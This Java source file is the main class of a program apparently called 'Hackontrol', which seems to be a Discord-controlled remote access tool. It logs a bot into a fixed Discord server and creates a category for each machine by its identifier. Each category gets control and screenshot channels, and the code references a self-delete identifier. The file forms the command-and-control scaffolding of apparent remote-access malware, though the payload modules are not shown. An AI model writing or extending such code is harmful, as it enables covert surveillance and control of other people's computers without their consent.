package com.khopan.hackontrol;

import java.util.ArrayList;
import java.util.List;

import com.khopan.hackontrol.channel.ControlChannel;
import com.khopan.hackontrol.channel.ScreenshotChannel;
import com.khopan.hackontrol.manager.Manager;
import com.khopan.hackontrol.manager.ManagerRegistry;
import com.khopan.hackontrol.registry.RegistrationHandler;
import com.khopan.hackontrol.registry.Registry;
import com.khopan.hackontrol.registry.RegistryType;
import com.khopan.hackontrol.utils.DiscordUtils;

import net.dv8tion.jda.api.JDA;
import net.dv8tion.jda.api.JDABuilder;
import net.dv8tion.jda.api.entities.Guild;
import net.dv8tion.jda.api.entities.channel.concrete.Category;
import net.dv8tion.jda.api.entities.channel.concrete.TextChannel;
import net.dv8tion.jda.api.requests.GatewayIntent;

public class Hackontrol {
	public static final RegistryType<Void, Class<? extends Manager>> MANAGER_REGISTRY = RegistryType.create(Hackontrol.class);

	public static final String DELETE_SELF_IDENTIFIER = "hackontrolSpecialDeleteSelf";

	private static Hackontrol INSTANCE;

	private final List<Manager> managerList;
	private final RegistrationHandler registrationHandler;
	private final JDA bot;
	private final Guild guild;
	private final Category category;
	private final List<HackontrolChannel> channelList;
	//private final List<ButtonHandlerEntry> handlerList;

	//private Consumer<Boolean> questionCallback;

	private Hackontrol() {
		Hackontrol.INSTANCE = this;
		this.managerList = new ArrayList<>();
		ManagerRegistry.register(new HackontrolManagerRegistryImplementation());
		this.registrationHandler = new RegistrationHandler();
		JDABuilder builder = JDABuilder.createDefault(Token.BOT_TOKEN).enableIntents(GatewayIntent.MESSAGE_CONTENT);
		this.managerList.forEach(manager -> manager.configureBuilder(builder));
		this.bot = builder.build();

		try {
			this.bot.awaitReady();
		} catch(Throwable Errors) {
			throw new RuntimeException();
		}

		this.guild = this.bot.getGuildById(1173967259304198154L);
		this.channelList = new ArrayList<>();
		this.addChannel();
		String identifier = Machine.getIdentifier();
		this.category = DiscordUtils.getOrCreateCategory(this.guild, identifier);
		//this.handlerList = new ArrayList<>();

		for(int i = 0; i < this.channelList.size(); i++) {
			HackontrolChannel hackontrolChannel = this.channelList.get(i);
			String channelName = hackontrolChannel.getName();
			TextChannel channel = DiscordUtils.getOrCreateTextChannelInCategory(this.category, channelName);
			hackontrolChannel.channel = channel;
			//hackontrolChannel.registerButtonHandler(this :: registerButtonHandler);
			Registry registry = this.registrationHandler.createRegistry(hackontrolChannel);
			hackontrolChannel.register(registry);

			if(DiscordUtils.isChannelEmpty(channel)) {
				hackontrolChannel.initialize();
			}
		}
	}

	private void addChannel() {
		this.channelList.add(new ControlChannel());
		this.channelList.add(new ScreenshotChannel());
	}

	/*private void registerButtonHandler(String buttonIdentifier, Consumer<ButtonInteraction> action) {
		ButtonHandlerEntry entry = new ButtonHandlerEntry();
		entry.buttonIdentifier = buttonIdentifier;
		entry.action = action;
		this.handlerList.add(entry);
	}*/

	public static void main(String[] args) throws Throwable {
		Hackontrol.getInstance();
	}

	public static Hackontrol getInstance() {
		if(Hackontrol.INSTANCE == null) {
			Hackontrol.INSTANCE = new Hackontrol();
		}

		return Hackontrol.INSTANCE;
	}

	private class HackontrolManagerRegistryImplementation implements Registry {
		@Override
		public <T, U> void register(RegistryType<T, U> type, T identifier, U value) {
			this.register(type, value);
		}

		@SuppressWarnings("unchecked")
		@Override
		public <U> void register(RegistryType<?, U> type, U value) {
			if(!Hackontrol.MANAGER_REGISTRY.equals(type)) {
				throw new IllegalArgumentException("Invalid registry type");
			}

			if(value == null) {
				return;
			}

			Class<? extends Manager> managerClass = (Class<? extends Manager>) value;

			try {
				Manager manager = managerClass.getDeclaredConstructor().newInstance();
				Hackontrol.this.managerList.add(manager);
			} catch(Throwable Errors) {
				throw new RuntimeException(Errors);
			}
		}
	}

	/*private class Listener extends ListenerAdapter {
		@Override
		public void onButtonInteraction(ButtonInteractionEvent Event) {
			Channel channel = Event.getChannel();

			if(!(channel instanceof TextChannel)) {
				return;
			}

			TextChannel textChannel = (TextChannel) channel;
			Category category = textChannel.getParentCategory();

			if(!Hackontrol.this.category.equals(category)) {
				return;
			}

			Button button = Event.getButton();
			String identifier = button.getId();
			ButtonInteraction interaction = new ButtonInteractionImplementation(Event);

			if(Hackontrol.this.questionCallback != null && ("ok".equals(identifier) || "cancel".equals(identifier))) {
				interaction.consume();

				if("ok".equals(identifier)) {
					Hackontrol.this.questionCallback.accept(true);
				} else {
					Hackontrol.this.questionCallback.accept(false);
				}

				Hackontrol.this.questionCallback = null;
				return;
			}

			if(Hackontrol.DELETE_SELF_IDENTIFIER.equals(identifier)) {
				interaction.consume();
				return;
			}

			for(int i = 0; i < Hackontrol.this.handlerList.size(); i++) {
				ButtonHandlerEntry entry = Hackontrol.this.handlerList.get(i);

				if(identifier.equals(entry.buttonIdentifier)) {
					entry.action.accept(interaction);
					return;
				}
			}
		}
	}

	private static class ButtonHandlerEntry {
		private String buttonIdentifier;
		private Consumer<ButtonInteraction> action;
	}

	private class ButtonInteractionImplementation implements ButtonInteraction {
		private final ButtonInteractionEvent Event;

		private ButtonInteractionImplementation(ButtonInteractionEvent Event) {
			this.Event = Event;
		}

		@Override
		public ButtonInteractionEvent getEvent() {
			return this.Event;
		}

		@Override
		public void consume() {
			this.Event.deferEdit().queue(hook -> hook.deleteOriginal().queue());
		}

		@Override
		public void okCancelQuestion(String question, Consumer<Boolean> callback) {
			this.question(question, callback, "Ok", "Cancel");
		}

		@Override
		public void yesNoQuestion(String question, Consumer<Boolean> callback) {
			this.question(question, callback, "Yes", "No");
		}

		private void question(String question, Consumer<Boolean> callback, String ok, String cancel) {
			Hackontrol.this.questionCallback = callback;
			this.Event.reply(question).addActionRow(Button.success("ok", ok), Button.danger("cancel", cancel)).queue();
		}
	}*/
}
